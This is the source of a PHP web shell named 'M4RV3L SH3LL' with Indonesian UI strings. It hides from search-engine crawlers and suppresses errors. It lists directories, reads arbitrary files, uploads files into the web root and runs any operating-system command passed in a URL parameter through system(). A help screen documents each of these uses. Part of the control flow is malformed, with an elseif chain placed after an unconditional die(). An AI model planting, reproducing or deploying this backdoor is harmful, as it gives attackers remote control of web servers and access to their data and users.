<?php
/*
M4RV3L SH3LL
By: ./MyHeartIsyr
Codename: Doctor Fate
*/
@set_time_limit(0);
@error_reporting(0);
@error_log(0);

// -- Just Protection from Bot

if(!empty($_SERVER['HTTP_USER_AGENT'])){
	$uaArray = array("GoogleBot", "PycURL", "MSNBot", "ia_archiver", "bingbot", "Yahoo! Slurp", "facebookexternalhit", "crawler", "Rambler", "Yandex");
	if(preg_match("/".implode("|", $uaArray)."/i", $_SERVER['HTTP_USER_AGENT'])){
		@header("HTTP/1.1 404 Not Found");
		exit;
	}
}


if(isset($_GET['d'])){
	$dx = $_GET['d'];
	chdir($dx);
}
else {
	$dx = getcwd();
}

echo "<pre>";
if($buka = opendir("$dx")){
	echo "<h2>Listing $dx</h2>";
	while($sken = readdir($buka)){
		if(is_dir("$dx/$sken")){
			echo "<a href=\"?d=$dx/$sken\"><font color='red'>";
		}
		else {
			echo "<a href=\"?f=$dx/$sken\"><font color='black'>";
		}
		echo "$sken\n";
		echo "</font></a>";
	}
}
else {
	echo "opendir() failed";
}
closedir($buka);
die("<hr>");


elseif(isset($_GET['f'])){
	echo "<pre>".htmlspecialchars(file_get_contents($_GET['f']))."</pre>";
	die;
}

elseif(isset($_GET['act']) && $_GET['act'] == "upload"){
?>
<form enctype="multipart/form-data" method="post"><center><input type="radio" checked name="tipe" value="biasa">Biasa
<input type="radio" name="tipe" value="public_html">public_html</center>
<center><input type="file" name="filenyo">&nbsp;<input type="submit" name="send" value=">>"></center></form>
<?php
if(isset($_POST['send'])){
	$tipeku = $_POST['tipe'];
	switch($tipeku){
		case "biasa":
			if(@copy($_FILES['filenyo']['tmp_name'], "".@getcwd()."/".$_FILES['filenyo']['name']."")){
				echo "<script>alert('[!] Berhasil coy!');</script>";
			}
			else {
				echo "<script>alert('[!] Gagal euy!');</script>";
			}
			break;
		case "public_html":
			$root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['filenyo']['name'];
			$web = $_SERVER['HTTP_HOST']."/".$_FILES['filenyo']['name'];
			if(is_writable($_SERVER['DOCUMENT_ROOT'])){
				if(@copy($_FILES['filenyo']['tmp_name'], $root)){
					echo "<script>alert('[!] Berhasil!');</script>";
				}
				else {
					echo "<script>alert('[!] Gagal!');</script>";
				}
			}
			else {
				echo "<script>alert('[i] Direktorinya gak writeable');</script>";
			}
			break;
		default: break;
	}
}
}

elseif(isset($_GET['act']) && $_GET['act'] == "shell"){
	if(empty($_GET['cmd'])){
		die("<font face='Courier New'>[!] Enter specified command, ex: uname -a; for linux, ver; for windows</font>");
	}
	echo "<pre>";
	system($_GET['cmd']);
	echo "</pre>";
	die;
}

elseif(isset($_GET['act']) && $_GET['act'] == "help"){
?>
<pre style="font-family: Courier New"><center>
--------------------------------------
--          M4RV3L SH3LL            --
-- Codename: Doctor Fate            --
--------------------------------------</center>

Use: "marvel.php?act=upload" for uploading files
Use: "marvel.php?act=shell&amp;cmd=uname -a" for shell
Use: "marvel.php?act=help" for print this text
</pre>
<?php
}

else {
	die("<font face='Courier New'>[!] use: marvel.php?act=help</font>");
}
?>
